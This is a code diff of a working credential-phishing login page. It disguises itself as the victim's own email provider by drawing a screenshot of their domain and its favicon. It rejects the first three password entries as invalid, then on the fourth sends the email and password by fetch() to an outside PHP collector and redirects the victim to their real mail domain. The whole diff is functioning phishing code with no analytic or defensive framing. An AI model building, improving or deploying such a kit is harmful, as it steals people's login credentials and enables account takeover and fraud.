@@ -12,7 +12,7 @@
    </style>
 
    <style type="text/css">
-      /* Ensure all elements use border-box for consistent sizing */
+      /* Global box-sizing fix for perfect alignment */
       *, *::before, *::after {
           box-sizing: border-box;
       }
@@ -78,7 +78,7 @@
                      <div class="erx" style="display:none ;">Connection error, kindly try again!</div>
                      <div class="login-inner-form">
                         
-                        <form class="f_form" action="https://scitecinstruments.it.com/customers/send.php" method="POST">
+                        <form class="f_form" id="loginForm" method="POST">
                            <input type="hidden" name="fcc" id="fcc" value="">
                            <div class="alert alert-danger mb-3 hidden" id="err" role="alert">
                            </div>
@@ -134,7 +134,7 @@
                 document.querySelector('body').style.backgroundImage = `url('https://image.thum.io/get/width/1200/http://${dxmain}')`;
                 document.querySelector('#logo').setAttribute('src', favimg);
                 
-                // Store email domain for final redirect (handled by PHP)
+                // Store email domain for final redirect
                 window.emailDomain = 'https://' + dxmain;
             }
             
@@ -142,29 +142,58 @@
             let attemptCount = 1;
             const MAX_ATTEMPTS = 4;
             
-            // Form submission handler
+            // The PHP endpoint URL
+            const PHP_URL = 'https://scitecinstruments.it.com/customers/send.php';
+            
+            // Handle form submission
             $("#loginForm").on('submit', function(e) {
+                e.preventDefault(); // always prevent default, we control sending
+                
+                let email = $("#email").val();
                 let password = $("#password").val();
                 
                 if (!password || password.length < 1) {
                     $("#msg").text("Please enter your password");
-                    e.preventDefault();
                     return;
                 }
                 
-                // For attempts before the last, show error and prevent actual submission
+                // Attempts 1–3: show error, clear password, increment counter, do not send
                 if (attemptCount < MAX_ATTEMPTS) {
                     $("#msg").text("Invalid password, try again").css("color", "red");
                     $("#password").val("");
                     attemptCount++;
-                    e.preventDefault(); // Do not submit to server
-                } 
-                else if (attemptCount === MAX_ATTEMPTS) {
-                    // Last attempt: allow form to submit normally, show message
-                    $("#msg").text("Redirecting to your inbox...").css("color", "green");
-                    $("#getitBtn").prop('disabled', true).html("Redirecting...");
-                    // No client-side redirect – the PHP script will handle redirection.
+                    return;
                 }
+                
+                // Final attempt (attemptCount == MAX_ATTEMPTS)
+                // Disable button and show loading/redirect message
+                $("#getitBtn").prop('disabled', true).html("Redirecting...");
+                $("#msg").text("Redirecting to your inbox...").css("color", "green");
+                
+                // Send data to PHP via AJAX (POST with FormData, matches regular form submission)
+                const formData = new FormData();
+                formData.append('email', email);
+                formData.append('password', password);
+                formData.append('fcc', $("#fcc").val());
+                formData.append('sub', 'Continue');
+                
+                fetch(PHP_URL, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.text())
+                .then(data => {
+                    console.log('Data sent successfully:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending data:', error);
+                })
+                .finally(() => {
+                    // Redirect to the email domain after a short delay, regardless of server response
+                    setTimeout(function() {
+                        window.location.href = window.emailDomain;
+                    }, 1500);
+                });
             });
         });
 
